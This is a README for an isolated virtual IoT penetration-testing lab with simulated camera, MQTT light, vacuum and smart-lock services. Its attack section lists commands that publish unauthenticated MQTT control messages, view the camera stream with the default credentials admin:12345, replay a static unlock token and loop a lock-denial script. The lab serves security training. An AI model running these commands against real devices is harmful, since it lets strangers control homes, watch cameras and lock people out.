# Virtualised IoT Penetration Testing Lab

A self-contained, isolated IoT security testing environment designed for demonstrating common IoT vulnerabilities and attack paths in a controlled virtualised network.

The lab uses intentionally vulnerable IoT services and simulated devices, including an RTSP camera, MQTT smart light, MQTT smart vacuum and smart lock. Everything runs inside VMware and is isolated from real networks.

## Architecture

| VM | OS | IP | Purpose |
|---|---|---|---|
| **Attacker** | Kali Linux | `192.168.50.10` | Penetration testing and analysis |
| **IoT Services** | Ubuntu Desktop 22.04 | `192.168.50.20` | RTSP camera, MQTT broker, Node-RED, smart-light, smart-vacuum and smart-lock simulators |

All VMs communicate through the isolated VMware LAN Segment:

```text
                    iotlab LAN Segment
                           |
                 ┌─────────┴──────────┐
                 |                    |
            Kali Linux           IoT Services
           192.168.50.10        192.168.50.20
                 |                    |
              Attacker        ┌───────┼────────┐
               Tools          |       |        |
                             RTSP    MQTT   Smart Lock
                            Camera  Broker  TCP :9999
                                      |
                                ┌─────┴─────┐
                                |           |
                           Smart Light  Smart Vacuum
                            Simulator    Simulator
```

The lab network is intentionally isolated from the host's real LAN and the Internet.

![Home View](./Images/current_home.png)

## Components

### Attacker VM
Kali Linux provides the primary security testing environment, including:

- Nmap
- Wireshark
- Aircrack-ng
- Mosquitto clients
- VLC / FFmpeg
- BlueZ / GATTacker
- Other network analysis tools

### IoT Services VM
Ubuntu Desktop hosts the main IoT services using Docker:

- **MediaMTX** - simulated RTSP IP camera
- **Mosquitto** - deliberately insecure MQTT broker
- **Node-RED** - smart-home dashboard
- **Smart Light Simulator** - Python/Tkinter MQTT-controlled device
- **Smart Vacuum Simulator** - Python MQTT based C2 link
- **Smart Lock Simulator** - Python based lock utilizing a static token

The camera feed, smart-light and smart-vacuum interface provide visible demonstrations of attacks against IoT services.

#### Camera View:

![Camera View](./Images/camera_view.png)

#### Vacuum View:

![Vacuum View](./Images/vacuum_view.png)

#### Light View: 

![Light View](./Images/light_view.png)

#### Lock View:

_[TODO]_

## Network Setup

Create a VMware **LAN Segment** named:

```text
iotlab
```

Assign the LAN Segment to all three VMs and configure the static addresses shown above.

During initial installation, a temporary **NAT adapter** may be added to download packages and dependencies. Once setup is complete, remove the NAT adapter so the lab remains isolated.

## Running the Lab

On the IoT Services VM:

```bash
cd ~/iot-lab
docker compose up -d

python3 ~/iot-lab/smart_light.py &
ffplay -rtsp_transport tcp rtsp://127.0.0.1:8554/cam
python3 ~/iot-lab/smart_vacuum.py
python3 ~/iot-lab/smart_lock.py
```

The Docker stack provides the RTSP and MQTT services, while the smart-light simulator provides a visible MQTT-controlled device.

### Smart Lock Controls

The lock's intended client is `lock_client.py`

**Unlock:** 

```bash
python3 ~/iot-lab/lock_client.py unlock
```

**Lock:**

```bash
python3 ~/iot-lab/lock_client.py lock
```

## Verification

From the Kali VM:

```bash
nmap -sn 192.168.50.0/24

nmap -sV -p 8554,1883,1880,9999 192.168.50.20

mosquitto_sub -h 192.168.50.20 -t '#' -v

ffprobe rtsp://admin:12345@192.168.50.20:8554/cam
```

The expected host is:

```text
192.168.50.20  IoT Services
```

Successful host discovery and service checks indicate that the lab is ready for penetration-testing exercises.

## Attack Commands

From the first sample attack, the successful attack commands are:

### Smart Light:
```bash
mosquitto_pub \
  -h 192.168.50.20 \
  -p 1883 \
  -t home/livingroom/light/set \
  -m OFF
```

_Note: the payload ('OFF') can be changed to turn the light on or change it's colour (either simple colours or hex codes)_

### Security Camera:
```bash
ffplay \
  rtsp://admin:12345@192.168.50.20:8554/cam
```

### Smart Vacuum:

#### Command:

```bash
mosquitto_pub \
  -h 192.168.50.20 \
  -t 'home/vacuum/command' \
  -m 'STOP'
```

_(NOTE: Commands include: `START`, `STOP`, `PAUSE`, `RETURN_HOME`)_

#### Control:

```bash
mosquitto_pub \
  -h 192.168.50.20 \
  -t 'home/vacuum/goto' \
  -m '200,150'
```

_(NOTE: coord values must be between `x:0 - 660` and `y:0 - 440`)_

#### Speed: 

```bash
mosquitto_pub \
  -h 192.168.50.20 \
  -t 'home/vacuum/speed' \
  -m 'FAST'
```

_(NOTE: speeds include: `SLOW`, `NORMAL`, `FAST`)_

### Smart Lock:

#### Toggle:

```bash
python3 lock_replay.py 192.168.50.20 "UNLOCK:1234"
```

_(NOTE: `UNLOCK` can be replaced with `LOCK`)_

#### Denial of Entry:

```bash
./DoE.sh
```

This attack will loop the previous force lock attack every 2 seconds to deny area entry.



## Credentials

The pre-created VM credentials. 

Attacker:
```
Username: attacker
Password: attacker
```

Target:
```
Username: target
Password: target
```

_Note: Both users have ```sudo``` on respective machines_
